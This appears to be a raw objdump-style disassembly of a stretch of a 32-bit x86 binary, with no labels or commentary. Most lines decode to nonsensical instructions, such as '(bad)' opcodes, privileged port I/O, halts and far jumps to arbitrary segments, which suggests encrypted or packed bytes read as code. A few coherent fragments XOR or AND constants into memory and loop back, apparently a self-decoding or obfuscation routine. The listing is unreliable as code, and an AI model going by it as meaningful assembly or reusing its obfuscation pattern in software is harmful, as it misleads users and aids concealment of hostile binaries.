  40b7d4:	xchg   DWORD PTR ds:0x40fc6a78,edx
  40b7da:	adc    DWORD PTR [esi-0x79],edx
  40b7dd:	pop    ebx
  40b7de:	adc    BYTE PTR [edx-0x73f806db],al
  40b7e4:	(bad)  
  40b7e6:	loopne 0x40b7e7
  40b7e8:	pusha  
  40b7e9:	icebp  
  40b7ea:	push   ss
  40b7eb:	sub    eax,0x801f5424
  40b7f0:	ins    DWORD PTR es:[edi],dx
  40b7f1:	pop    esi
  40b7f2:	sub    esp,DWORD PTR [eax]
  40b7f4:	div    BYTE PTR [esp+edi*4-0x2d]
  40b7f8:	stos   DWORD PTR es:[edi],eax
  40b7f9:	or     ah,BYTE PTR [ebp+0xdda02d0]
  40b7ff:	jbe    0x40b84f
  40b801:	lock pop esp
  40b803:	hlt    
  40b804:	ss dec ebp
  40b806:	mov    bl,0xa9
  40b808:	in     al,0x2a
  40b80a:	mov    al,ds:0xa5f9f0fe
  40b80f:	mov    ds,WORD PTR [esi-0x71210d4a]
  40b815:	mov    ecx,0x674333b0
  40b81a:	fld    TBYTE PTR [esi+0x3fa9ea6]
  40b820:	jbe    0x40b87c
  40b822:	ja     0x40b820
  40b824:	pop    esp
  40b825:	scas   al,BYTE PTR es:[edi]
  40b826:	xor    DWORD PTR [ebp-0x5e],esi
  40b829:	and    esp,DWORD PTR [ecx+0x74]
  40b82c:	cmp    al,0x22
  40b82e:	cs jecxz 0x40b7f9
  40b831:	and    al,0x59
  40b833:	add    DWORD PTR [esi+0x37e68889],esp
  40b839:	sti    
  40b83a:	pop    esi
  40b83b:	test   BYTE PTR fs:0x550a21dc,dl
  40b842:	sub    cl,0x5
  40b845:	add    BYTE PTR [ecx-0x20],0xf8
  40b849:	leave  
  40b84a:	in     al,0xb
  40b84c:	pop    esi
  40b84d:	mov    esp,0x8fdb9f5d
  40b852:	outs   dx,BYTE PTR ds:[esi]
  40b853:	jmp    0xcf85:0x8cf1c88d
  40b85a:	adc    DWORD PTR [ecx-0x5bdbe6f7],0x781c0430
  40b864:	rol    DWORD PTR [edx-0x7b4ade1a],cl
  40b86a:	adc    DWORD PTR [esi+0x75e8ed3],ebx
  40b870:	sub    eax,0xd367726
  40b875:	(bad)  
  40b877:	retf   
  40b878:	sti    
  40b879:	repz dec edi
  40b87b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b87c:	aas    
  40b87d:	stc    
  40b87e:	fmul   DWORD PTR [ecx+0xb47b26f]
  40b884:	mov    ebx,0x797eef5f
  40b889:	gs mov ebx,0x70cfaa1c
  40b88f:	push   ebp
  40b890:	dec    ebp
  40b891:	xchg   edx,eax
  40b892:	push   ss
  40b893:	mov    eax,0xda0c4c42
  40b898:	cmp    al,0x8f
  40b89a:	lds    esp,FWORD PTR [edi]
  40b89c:	fistp  DWORD PTR [edx-0x7b]
  40b89f:	xchg   ebp,eax
  40b8a0:	jl     0x40b836
  40b8a2:	dec    edi
  40b8a3:	test   dl,al
  40b8a5:	xchg   edi,eax
  40b8a6:	scas   al,BYTE PTR es:[edi]
  40b8a7:	and    eax,0x1f4d43a9
  40b8ac:	ss mov eax,0x87c1861b
  40b8b2:	pop    ss
  40b8b3:	or     eax,0x70f5a4fc
  40b8b8:	loope  0x40b899
  40b8ba:	mov    cl,0x44
  40b8bc:	mov    ds:0xf5eda301,al
  40b8c1:	aas    
  40b8c2:	mov    ch,0xa9
  40b8c4:	pop    eax
  40b8c5:	je     0x40b870
  40b8c7:	cwde   
  40b8c8:	sbb    ebx,DWORD PTR [eax]
  40b8ca:	inc    esp
  40b8cb:	mov    ebp,0x2c5bc2f9
  40b8d0:	loopne 0x40b888
  40b8d2:	sti    
  40b8d3:	popf   
  40b8d4:	sar    DWORD PTR [ecx],0x81
  40b8d7:	pop    ebp
  40b8d8:	mov    WORD PTR [edx],cs
  40b8da:	mov    ah,0x94
  40b8dc:	test   DWORD PTR [ebx+0xb],0x9124ec61
  40b8e3:	test   BYTE PTR [eax-0x6c06fc42],al
  40b8e9:	mov    ecx,ecx
  40b8eb:	mov    ds:0x1622c851,al
  40b8f0:	push   edi
  40b8f1:	jle    0x40b93d
  40b8f3:	js     0x40b929
  40b8f5:	push   ebx
  40b8f6:	pop    edi
  40b8f7:	sti    
  40b8f8:	cmp    DWORD PTR [edx],0xb073f4a0
  40b8fe:	push   ds
  40b8ff:	sbb    al,0xa
  40b901:	mov    ebp,0x91fe52de
  40b906:	test   cl,al
  40b908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b909:	mov    ah,0xae
  40b90b:	jb     0x40b947
  40b90d:	jnp    0x40b94c
  40b90f:	les    esi,FWORD PTR [esi-0x5f]
  40b912:	dec    edi
  40b913:	iret   
  40b914:	cmp    eax,0x7b31a8c6
  40b919:	je     0x40bc46
  40b91f:	mov    eax,DWORD PTR [ebp-0x10]
  40b922:	and    DWORD PTR [eax],0x751c80
  40b928:	jmp    0x40b5e7
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	shr    DWORD PTR [ebx+edx*4-0x73394725],cl
  40b944:	js     0x40b9be
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	clc    
  40b94b:	pop    esp
  40b94c:	es adc eax,0x1186aa8c
  40b952:	xor    eax,0x5f3d5e87
  40b957:	dec    edi
  40b958:	mov    ebx,0x82632ab1
  40b95d:	lods   eax,DWORD PTR ds:[esi]
  40b95e:	mov    al,0xdd
  40b960:	add    al,0xa3
  40b962:	call   0x193960eb
  40b967:	mov    bl,0xac
  40b969:	out    0xf9,al
  40b96b:	inc    ecx
  40b96c:	test   DWORD PTR [edx+0x4],edx
  40b96f:	mov    edx,0x38556e9e
  40b974:	fidivr WORD PTR [esi]
  40b976:	in     al,dx
  40b977:	out    0xb6,eax
  40b979:	into   
  40b97a:	dec    edi
  40b97b:	dec    ecx
  40b97c:	sub    ch,bl
  40b97e:	sbb    dl,0xd1
  40b981:	shl    BYTE PTR [ebx-0x53fe9893],1
  40b987:	(bad)  
  40b988:	push   0xffffff8e
  40b98a:	push   esi
  40b98b:	pop    es
  40b98c:	mov    dl,0x39
  40b98e:	out    dx,eax
  40b98f:	mov    BYTE PTR [esi],ch
  40b991:	imul   ebx,eax,0xffffffe5
  40b994:	inc    edx
  40b995:	mov    ds:0x430c72d1,al
  40b99a:	test   eax,0xbc81a5bb
  40b99f:	hlt    
  40b9a0:	inc    esp
  40b9a1:	ret    0x5052
  40b9a4:	(bad)  
  40b9a5:	imul   ebp,DWORD PTR [edx+0x4cd8d64d],0xd88baa1a
  40b9af:	or     al,0x91
  40b9b1:	inc    ecx
  40b9b2:	push   ecx
  40b9b3:	fld    TBYTE PTR [edx-0x11]
  40b9b6:	es push ds
  40b9b8:	sbb    ah,ch
  40b9ba:	and    al,0xd0
  40b9bc:	jno    0x40ba11
  40b9be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9bf:	ja     0x40b97e
  40b9c1:	xchg   edi,eax
  40b9c2:	pop    ss
  40b9c3:	inc    edx
  40b9c4:	and    bh,BYTE PTR [edi+edi*4+0x41]
  40b9c8:	mov    ah,0x2b
  40b9ca:	pop    ebx
  40b9cb:	aam    0xe2
  40b9cd:	rcr    BYTE PTR [eax-0x5dc4d08f],1
  40b9d3:	leave  
  40b9d4:	inc    esi
  40b9d5:	push   0x79e7918b
  40b9da:	mov    bl,0x83
  40b9dc:	int3   
  40b9dd:	imul   esp,DWORD PTR [ecx],0xa9545fff
  40b9e3:	or     al,0xbd
  40b9e5:	out    dx,al
  40b9e6:	and    DWORD PTR [edx+0x3821b73b],0xffffffe4
  40b9ed:	stos   DWORD PTR es:[edi],eax
  40b9ee:	shl    BYTE PTR [esi],cl
  40b9f0:	adc    eax,0x5abe5cf2
  40b9f5:	cmp    BYTE PTR [ebx*1-0x97622e1],bh
  40b9fc:	adc    ecx,ebp
  40b9fe:	mov    edx,0x3b9c618a
  40ba03:	mov    ebp,0xa1422d61
  40ba08:	mov    esp,DWORD PTR [edx-0x73b9fd03]
  40ba0e:	ret    0xc6cf
  40ba11:	mov    bh,0xc1
  40ba13:	retf   0x17a8
  40ba16:	mov    ah,0x78
  40ba18:	mov    al,0x2b
  40ba1a:	call   0xdd4e30b8
  40ba1f:	es mov ch,0xa3
  40ba22:	mov    ds:0x798c3db6,al
  40ba27:	cli    
  40ba28:	test   eax,0x6d73c466
  40ba2d:	push   0x7e
  40ba2f:	and    al,0x41
  40ba31:	stc    
  40ba32:	mov    esp,0x3f7c90ce
  40ba37:	fstp   QWORD PTR [ebx-0x43]
  40ba3a:	sub    bh,bl
  40ba3c:	cwde   
  40ba3d:	inc    esi
  40ba3e:	std    
  40ba3f:	(bad)  
  40ba41:	cmp    eax,0x7dc43053
  40ba46:	out    dx,al
  40ba47:	shl    BYTE PTR ds:0xdbfbe8dd,1
  40ba4d:	(bad)  [ecx-0x76]
  40ba50:	inc    esi
  40ba51:	data16 sbb dh,BYTE PTR [esi]
  40ba54:	mov    BYTE PTR [ecx+0x4e6eb68d],ch
  40ba5a:	inc    ebx
  40ba5b:	pop    edi
  40ba5c:	or     BYTE PTR [esi+edx*2],al
  40ba5f:	xchg   BYTE PTR [ecx],bl
  40ba61:	dec    eax
  40ba62:	jno    0x40ba2e
  40ba64:	mov    dl,0xc2
  40ba66:	cs stos BYTE PTR es:[edi],al
  40ba68:	inc    ebx
  40ba69:	inc    ecx
  40ba6a:	lods   eax,DWORD PTR ds:[esi]
  40ba6b:	ja     0x40b9fa
  40ba6d:	push   ebp
  40ba6e:	inc    eax
  40ba6f:	mov    edx,0x25ecdf2
  40ba74:	dec    edi
  40ba75:	out    0x14,eax
  40ba77:	mov    ebx,0x1318df61
  40ba7c:	sub    bh,ch
  40ba7e:	aam    0x5f
  40ba80:	je     0x40babb
  40ba82:	jae    0x40bae2
  40ba84:	or     BYTE PTR [ecx+edi*8-0x4d86e5e9],dh
  40ba8b:	add    eax,0x5169b9d5
  40ba90:	gs cdq 
  40ba92:	lods   al,BYTE PTR ds:[esi]
  40ba93:	rcr    eax,1
  40ba95:	sub    DWORD PTR [ebp-0x22],edi
  40ba98:	adc    cl,ah
  40ba9a:	sub    DWORD PTR [ebx+ebx*1+0x21],0xffffffe6
  40ba9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baa0:	xchg   ecx,eax
  40baa1:	pop    ebx
  40baa2:	lock push eax
  40baa4:	cs shr al,0x2e
  40baa8:	sub    al,0x8
  40baaa:	inc    ebx
  40baab:	int    0xf4
  40baad:	jno    0x40ba81
  40baaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bab0:	call   0x8cae:0x6d4c38b
  40bab7:	xor    al,0x87
  40bab9:	icebp  
  40baba:	ret    
  40babb:	push   edx
  40babc:	cdq    
  40babd:	push   ss
  40babe:	xchg   ebx,eax
  40babf:	hlt    
  40bac0:	jae    0x40bad3
  40bac2:	adc    DWORD PTR [ecx+ecx*1+0x36690bfd],0x6d7c747d
  40bacd:	push   bp
  40bacf:	jmp    0x7ffd:0x777acdca
  40bad6:	adc    al,0x18
  40bad8:	jmp    0xe185ab24
  40badd:	mov    ebx,0xd7799217
  40bae2:	call   0x638c2575
  40bae7:	loop   0x40bae4
  40bae9:	mov    al,ds:0x12a2d1fa
  40baee:	dec    ecx
  40baef:	add    al,0x4d
  40baf1:	fcom   DWORD PTR [edi-0x7b]
  40baf4:	and    al,0x65
  40baf6:	fcomp  st(5)
  40baf8:	sti    
  40baf9:	mov    esi,0x6bcac1d9
  40bafe:	stc    
  40baff:	les    edi,FWORD PTR [ecx+0x7c6fa853]
  40bb05:	xchg   ebp,eax
  40bb06:	fbstp  TBYTE PTR [ecx+0x1b6c2885]
  40bb0c:	test   BYTE PTR [eax],ah
  40bb0e:	pushf  
  40bb0f:	in     al,dx
  40bb10:	rcl    BYTE PTR [esi],cl
  40bb12:	jge    0x40bb01
  40bb14:	test   BYTE PTR [edx+eiz*2+0x35421524],bh
  40bb1b:	adc    al,cl
  40bb1d:	idiv   eax
  40bb1f:	lock out dx,al
  40bb21:	in     eax,0x11
  40bb23:	cdq    
  40bb24:	pop    ebp
  40bb25:	jbe    0x40bada
  40bb27:	das    
  40bb28:	imul   esi,ebp,0xfffffff3
  40bb2b:	adc    dh,BYTE PTR [edi+0x30ba5c39]
  40bb31:	jp     0x40bb8e
  40bb33:	in     al,0x13
  40bb35:	jbe    0x40bb4b
  40bb37:	adc    BYTE PTR [edx],dl
  40bb39:	repnz mov ch,0xd7
  40bb3c:	add    bh,BYTE PTR [esi]
  40bb3e:	lahf   
  40bb3f:	icebp  
  40bb40:	(bad)  
  40bb41:	sub    DWORD PTR [edi*8-0x253da994],ebx
  40bb48:	aad    0xd7
  40bb4a:	aad    0xc6
  40bb4c:	std    
  40bb4d:	ins    BYTE PTR es:[edi],dx
  40bb4e:	push   cs
  40bb4f:	bound  edi,QWORD PTR [ecx]
  40bb51:	call   0xaced:0xe570744a
  40bb58:	inc    edx
  40bb59:	(bad)  
  40bb5a:	pop    esp
  40bb5b:	test   al,0x78
  40bb5d:	mov    fs,WORD PTR [edi]
  40bb5f:	dec    edi
  40bb60:	int3   
  40bb61:	pop    edi
  40bb62:	(bad)  
  40bb63:	cmc    
  40bb64:	rcr    BYTE PTR [ebx],0x8c
  40bb67:	jns    0x40bb95
  40bb69:	psubw  mm7,QWORD PTR [edi+0x4af72077]
  40bb70:	mov    ds:0xc3520d3e,al
  40bb75:	dec    ebp
  40bb76:	pop    edx
  40bb77:	mov    cl,0xc8
  40bb79:	push   esi
  40bb7a:	pushf  
  40bb7b:	cmp    eax,DWORD PTR ds:[edx+0x49]
  40bb7f:	neg    DWORD PTR [ebp+0x1e]
  40bb82:	mov    esp,0x831682d8
  40bb87:	sbb    DWORD PTR [edi-0x380c2be1],ecx
  40bb8d:	daa    
  40bb8e:	and    cl,BYTE PTR [edx+0x2b030f9a]
  40bb94:	in     al,dx
  40bb95:	sbb    BYTE PTR [ecx-0xf],0x5e
  40bb99:	stc    
  40bb9a:	test   DWORD PTR [ecx],ebx
  40bb9c:	xsha1  (bad)
  40bb9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb9e:	push   cs
  40bb9f:	shl    BYTE PTR [ebx],1
  40bba1:	mov    BYTE PTR [ebx+0x739cd222],ah
  40bba7:	adc    BYTE PTR [ebp-0x5b],bh
  40bbaa:	xor    DWORD PTR [eax+0x69],edx
  40bbad:	mov    ebp,0x20072720
  40bbb2:	jmp    0x8cd2:0x627df05b
  40bbb9:	mov    eax,?
  40bbbb:	sub    DWORD PTR [ecx-0x11],edi
  40bbbe:	add    al,BYTE PTR [edx-0x7b]
  40bbc1:	mov    DWORD PTR [edi],esp
  40bbc3:	pusha  
  40bbc4:	enter  0x4efb,0xd0
  40bbc8:	sub    al,0x8c
  40bbca:	xchg   BYTE PTR [ecx],al
  40bbcc:	mov    edi,DWORD PTR [ecx+0x79]
  40bbcf:	ins    DWORD PTR es:[edi],dx
  40bbd0:	mov    ebp,0x5947cc12
  40bbd5:	out    dx,ax
  40bbd7:	sbb    al,0x6b
  40bbd9:	xchg   DWORD PTR [ecx+eiz*1+0x37],edx
  40bbdd:	(bad)  
  40bbde:	cli    
  40bbdf:	sbb    ch,BYTE PTR [ebp-0xc229879]
  40bbe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbe6:	lock test al,0xef
  40bbe9:	sbb    DWORD PTR [edi-0x4a],esp
  40bbec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbed:	ja     0x40bbcf
  40bbef:	fs xor al,ch
  40bbf2:	or     eax,0x97de80e8
  40bbf7:	push   0xffffffef
  40bbf9:	test   DWORD PTR [ebx],ecx
  40bbfb:	out    dx,al
  40bbfc:	mov    eax,ds:0xd8fd7242
  40bc01:	cmp    eax,0x1cb45345
  40bc06:	xchg   edi,eax
  40bc07:	sahf   
  40bc08:	cs mov ebp,0x7e43c2f
  40bc0e:	sub    DWORD PTR [edx+0x30],eax
  40bc11:	(bad)  
  40bc12:	pop    esp
  40bc13:	ja     0x40bba5
  40bc15:	jns    0x40bc8c
  40bc17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc18:	mov    ebx,0xade6b473
  40bc1d:	and    eax,0x67008611
  40bc22:	add    eax,0x4721449e
  40bc27:	push   es
  40bc28:	aad    0x89
  40bc2a:	jmp    0x6082da9d
  40bc2f:	inc    edx
  40bc30:	sub    bh,al
  40bc32:	mov    ah,0xe8
  40bc34:	mov    ?,ecx
  40bc36:	and    DWORD PTR [eax-0x22f56ce4],ebp
  40bc3c:	sub    BYTE PTR [esp+eiz*2-0x888ed95],0xc3
  40bc44:	in     al,0x16
  40bc46:	mov    eax,DWORD PTR [ebp-0xc]
  40bc49:	mov    edx,DWORD PTR [ebp-0x18]
  40bc4c:	or     eax,edx
  40bc4e:	cmp    eax,0xfa9f7e76
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bc31
  40bc7d:	and    ecx,DWORD PTR [ebx]
  40bc7f:	cs ret 0x7891
  40bc83:	js     0x40bcf9
  40bc85:	jle    0x40bcff
  40bc87:	js     0x40bcd9
  40bc89:	add    BYTE PTR [ecx-0x3e],dh
  40bc8c:	repnz out 0xe0,al
  40bc8f:	std    
  40bc90:	shl    BYTE PTR [edi-0x4f],cl
  40bc93:	aad    0x23
  40bc95:	jns    0x40bcf2
  40bc97:	pusha  
  40bc98:	dec    ecx
  40bc99:	or     eax,0x30a366c2
  40bc9e:	dec    eax
  40bc9f:	adc    DWORD PTR [ebp-0x38],0xe33ce525
  40bca6:	pop    edx
  40bca7:	mov    dl,0x60
  40bca9:	(bad)  
  40bcaa:	(bad)  
  40bcab:	neg    BYTE PTR [ebp-0x38]
  40bcae:	jle    0x40bcdd
  40bcb0:	nop
  40bcb1:	jo     0x40bd1f
  40bcb3:	xchg   ebp,eax
  40bcb4:	imul   esp,DWORD PTR [ecx-0x75],0xffffffc0
  40bcb8:	popa   
  40bcb9:	or     eax,0xd53e4c4e
  40bcbe:	push   edi
  40bcbf:	or     eax,0x9c108a57
  40bcc4:	pop    ds
  40bcc5:	nop/reserved BYTE PTR [esi]
  40bcc8:	imul   edi,DWORD PTR [ebp+0x2462b95],0xffffffdd
  40bccf:	adc    eax,0x67ce4910
  40bcd4:	sbb    BYTE PTR [eax-0x2bba70f1],ch
  40bcda:	je     0x40bccc
  40bcdc:	fistp  WORD PTR [ebp+0xcd17e45]
  40bce2:	jbe    0x40bd41
  40bce4:	dec    esi
  40bce5:	xchg   edi,eax
  40bce6:	cld    
  40bce7:	mov    cl,0xf2
  40bce9:	add    BYTE PTR [edx],ch
  40bceb:	mov    bl,0xcd
  40bced:	adc    al,0xe2
  40bcef:	and    eax,0x8e02fb61
  40bcf4:	mov    esi,0xe9ad1f77
  40bcf9:	push   cs
  40bcfa:	outs   dx,BYTE PTR ds:[esi]
  40bcfb:	loop   0x40bcf3
  40bcfd:	ret    0x2456
  40bd00:	test   DWORD PTR ds:0x8256f637,ebp
  40bd06:	(bad)  
  40bd07:	push   DWORD PTR [edi]
  40bd09:	sahf   
  40bd0a:	pop    ds
  40bd0b:	iret   
  40bd0c:	xchg   edi,eax
  40bd0d:	inc    esi
  40bd0e:	pop    ss
  40bd0f:	aaa    
  40bd10:	shr    DWORD PTR [edx+0x131114da],0xb3
  40bd17:	ins    BYTE PTR es:[edi],dx
  40bd18:	dec    ecx
  40bd19:	mov    edx,0xdafcf29d
  40bd1e:	mov    al,ds:0x37194c13
  40bd23:	mov    dl,0x42
  40bd25:	and    DWORD PTR [esi-0x3b],ecx
  40bd28:	mov    al,0xdd
  40bd2a:	xchg   edi,eax
  40bd2b:	rol    BYTE PTR [eax-0x71a91579],1
  40bd31:	dec    esi
  40bd32:	sub    esp,esp
  40bd34:	sub    eax,0x6378d78
  40bd39:	pop    edx
  40bd3a:	add    BYTE PTR ds:0x75ae34fe,al
  40bd40:	jo     0x40bd98
  40bd42:	pop    edi
  40bd43:	loopne 0x40bcdf
  40bd45:	push   edx
  40bd46:	xchg   bl,dl
  40bd48:	xor    DWORD PTR [ebp+0x34d774c3],esi
  40bd4e:	cld    
  40bd4f:	fldlg2 
  40bd51:	aaa    
  40bd52:	or     eax,0xbe2b1487
  40bd57:	in     al,dx
  40bd58:	adc    dh,ah
  40bd5a:	inc    ecx
  40bd5b:	stos   DWORD PTR es:[edi],eax
  40bd5c:	daa    
  40bd5d:	jge    0x40bd20
  40bd5f:	xchg   DWORD PTR [ecx+0x2742b31a],esi
  40bd65:	adc    DWORD PTR [edi-0x33],ebp
  40bd68:	cmp    eax,0xe7d14046
  40bd6d:	test   eax,0xfba550c
  40bd72:	clc    
  40bd73:	sub    bl,ah
  40bd75:	add    ch,BYTE PTR [ecx]
  40bd77:	add    BYTE PTR [ebp-0x5f95286c],dl
  40bd7d:	test   al,0x96
  40bd7f:	jb     0x40bd5c
  40bd81:	xchg   esi,eax
  40bd82:	out    dx,al
  40bd83:	int3   
  40bd84:	xchg   ecx,eax
  40bd85:	cwde   
  40bd86:	lea    ebp,[edx+0x22aed59c]
  40bd8c:	mov    eax,ds:0x718436ab
  40bd91:	mov    dh,0xe
  40bd93:	sbb    edi,ebp
  40bd95:	pop    ebp
  40bd96:	(bad)  [ecx]
  40bd98:	call   0x33216cba
  40bd9d:	dec    eax
  40bd9e:	imul   eax,DWORD PTR [edx+0x77c7432c],0xffffffd3
  40bda5:	jns    0x40bdca
  40bda7:	sbb    ecx,DWORD PTR [ebp-0x2641a501]
  40bdad:	cli    
  40bdae:	arpl   WORD PTR [eax+0x69],si
  40bdb1:	stc    
  40bdb2:	pop    ebp
  40bdb3:	mov    ebp,0x2252c153
  40bdb8:	in     eax,dx
  40bdb9:	lahf   
  40bdba:	ror    BYTE PTR ds:0x872847fa,0xf0
  40bdc1:	gs xchg edx,eax
  40bdc3:	push   cs
  40bdc4:	popf   
  40bdc5:	addr16 mov edx,0x427cf9b0
  40bdcb:	enter  0xf0dc,0x6d
  40bdcf:	mov    al,ds:0xc1d1f261
  40bdd4:	ds push esi
  40bdd6:	adc    esi,DWORD PTR [ebx]
  40bdd8:	in     eax,0xd9
  40bdda:	fisttp DWORD PTR [esi+0x2443a684]
  40bde0:	out    0x7c,al
  40bde2:	mov    edi,0x623ebc12
  40bde7:	lea    ebp,es:[eax-0x5e]
  40bdeb:	loopne 0x40bdf7
  40bded:	sbb    eax,0x639e5442
  40bdf2:	add    BYTE PTR [ecx-0x61],dl
  40bdf5:	clc    
  40bdf6:	int    0x63
  40bdf8:	push   cs
  40bdf9:	inc    edi
  40bdfa:	adc    DWORD PTR [eax+0x2f],esp
  40bdfd:	pushf  
  40bdfe:	(bad)  
  40bdff:	push   esp
  40be00:	xor    edi,DWORD PTR [edi]
  40be02:	retf   
  40be03:	mov    bh,0xa6
  40be05:	mov    eax,edx
  40be07:	adc    DWORD PTR [edi+0x52],eax
  40be0a:	je     0x40bdec
  40be0c:	inc    edx
  40be0d:	jnp    0x40be27
  40be0f:	inc    ebp
  40be10:	and    BYTE PTR [ebx+0x1885fd42],bh
  40be16:	popa   
  40be17:	js     0x40bd9e
  40be19:	mov    al,ds:0xd354dc93
  40be1e:	mov    esi,0x5d8da09d
  40be23:	data16 inc BYTE PTR es:[ecx-0x11d6b22d]
  40be2b:	test   eax,0xcb7e4281
  40be30:	adc    al,bl
  40be32:	int    0x54
  40be34:	nop
  40be35:	cmp    ebp,DWORD PTR [eax]
  40be37:	ret    
  40be38:	hlt    
  40be39:	or     DWORD PTR [edx+0x2a],0x3f
  40be3d:	cld    
  40be3e:	out    dx,eax
  40be3f:	sahf   
  40be40:	bound  esi,QWORD PTR [edi]
  40be42:	hlt    
  40be43:	mov    es,WORD PTR [ebx-0x3e9a6ee3]
  40be49:	and    dh,al
  40be4b:	ja     0x40be2a
  40be4d:	sbb    DWORD PTR [ecx+eax*4-0x50],edx
  40be51:	adc    esi,DWORD PTR [esi]
  40be53:	and    eax,0x2987aeb0
  40be58:	lods   al,BYTE PTR ds:[esi]
  40be59:	ja     0x40bde1
  40be5b:	mov    WORD PTR [edx],gs
  40be5d:	stos   DWORD PTR es:[edi],eax
  40be5e:	inc    esi
  40be5f:	pusha  
  40be60:	fst    QWORD PTR [esi+0x17]
  40be63:	mov    ebp,0xdd73194
  40be68:	push   esi
  40be69:	cdq    
  40be6a:	mov    bh,0xb3
  40be6c:	xchg   esi,eax
  40be6d:	ret    
  40be6e:	jnp    0x40beb8
  40be70:	or     esi,DWORD PTR [ebp-0x7a546901]
  40be76:	cdq    
  40be77:	sub    al,0xea
  40be79:	xor    eax,0xf96b15c7
  40be7e:	add    eax,0xe8f07a27
  40be83:	call   0xef994bb
  40be88:	fucomi st,st(3)
  40be8a:	or     dl,BYTE PTR [esi+0x62]
  40be8d:	lods   al,BYTE PTR ds:[esi]
  40be8e:	push   esi
  40be8f:	add    esi,DWORD PTR [edx-0x5fbffd14]
  40be95:	cmp    eax,0x2a563ac0
  40be9a:	mov    ecx,0xdb010206
  40be9f:	mov    ecx,0xf1b1fed2
  40bea4:	mov    esp,0x608e7cb6
  40bea9:	std    
  40beaa:	mov    ch,0x86
  40beac:	or     al,0xa8
  40beae:	adc    al,0xfb
  40beb0:	push   edx
  40beb1:	mov    dl,0xe
  40beb3:	push   cs
  40beb4:	add    DWORD PTR [eax+esi*8+0x4c],eax
  40beb8:	loopne 0x40bf0e
  40beba:	inc    esi
  40bebb:	int    0x63
  40bebd:	shl    DWORD PTR [ebx+0x46469b6],1
  40bec3:	xor    al,0xe6
  40bec5:	popf   
  40bec6:	sti    
  40bec7:	ins    BYTE PTR es:[edi],dx
  40bec8:	mov    eax,ds:0xb253b5d9
  40becd:	mov    esp,0x531f6cb5
  40bed2:	int3   
  40bed3:	xchg   ecx,eax
  40bed4:	lods   eax,DWORD PTR ds:[esi]
  40bed5:	ret    0xd997
  40bed8:	cmc    
  40bed9:	call   0x8d4b:0x9268bc7c
  40bee0:	aaa    
  40bee1:	aas    
  40bee2:	in     al,0x70
  40bee4:	stos   BYTE PTR es:[edi],al
  40bee5:	int    0x27
  40bee7:	in     al,0xfc
  40bee9:	push   ss
  40beea:	js     0x40bed4
  40beec:	aad    0x5f
  40beee:	add    eax,0xc0981130
  40bef3:	mov    eax,ds:0xb4a9698
  40bef8:	inc    ecx
  40bef9:	jge    0x40be7d
  40befb:	aas    
  40befc:	add    bl,BYTE PTR [ebx]
  40befe:	cmp    ebx,esi
  40bf00:	xchg   ebx,eax
  40bf01:	jge    0x40beab
  40bf03:	cmp    BYTE PTR [edx-0x69],0xc4
  40bf07:	xor    BYTE PTR [ebp+edx*2-0x41],0x95
  40bf0c:	push   ebx
  40bf0d:	jp     0x40bea4
  40bf0f:	and    DWORD PTR [ecx+0x3f2b6003],edi
  40bf15:	dec    ebx
  40bf16:	retf   0x472c
  40bf19:	dec    esi
  40bf1a:	clc    
  40bf1b:	adc    dl,bl
  40bf1d:	adc    ah,BYTE PTR [ecx-0x75]
  40bf20:	push   eax
  40bf21:	dec    eax
  40bf22:	and    eax,0x873396a9
  40bf27:	dec    esi
  40bf28:	mov    ch,0x77
  40bf2a:	pop    edi
  40bf2b:	aas    
  40bf2c:	dec    esi
  40bf2d:	push   ss
  40bf2e:	pop    esi
  40bf2f:	push   edx
  40bf30:	arpl   WORD PTR [ecx-0x59],sp
  40bf33:	push   es
  40bf34:	jle    0x40bee0
  40bf36:	je     0x40befd
  40bf38:	enter  0x5572,0x6b
  40bf3c:	and    al,0x54
  40bf3e:	stos   DWORD PTR es:[edi],eax
  40bf3f:	fisttp DWORD PTR [edx+ebx*4+0x7a]
  40bf43:	aad    0xad
  40bf45:	into   
  40bf46:	xchg   esi,eax
  40bf47:	inc    edx
  40bf48:	lea    eax,[edi]
  40bf4a:	add    al,0x1
  40bf4c:	jle    0x40bfc5
  40bf4e:	leave  
  40bf4f:	lods   al,BYTE PTR ds:[esi]
  40bf50:	push   esi
  40bf51:	inc    edx
  40bf52:	xor    DWORD PTR [edx+0x66],esp
  40bf55:	jle    0x40bf72
  40bf57:	push   0x5e
  40bf59:	push   ss
  40bf5a:	mov    dl,0x73
  40bf5c:	out    0x25,al
  40bf5e:	addr16 adc eax,0x14f09a67
  40bf64:	js     0x40bf5e
  40bf66:	jne    0x40bf59
  40bf68:	iret   
  40bf69:	cmp    dl,BYTE PTR es:[eax]
  40bf6c:	push   edi
  40bf6d:	fcomp  QWORD PTR [bp+di-0x6dc4]
  40bf72:	add    DWORD PTR [ebx],eax
  40bf74:	xchg   BYTE PTR [eax-0x98ae97b],bl
  40bf7a:	std    
  40bf7b:	adc    edx,DWORD PTR [esi+0x39]
  40bf7e:	inc    edx
  40bf7f:	xor    al,BYTE PTR [ebx+edx*4]
  40bf82:	popf   
  40bf83:	add    BYTE PTR [ebx+0x3f8b087d],cl
  40bf89:	mov    edx,0x8a36
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
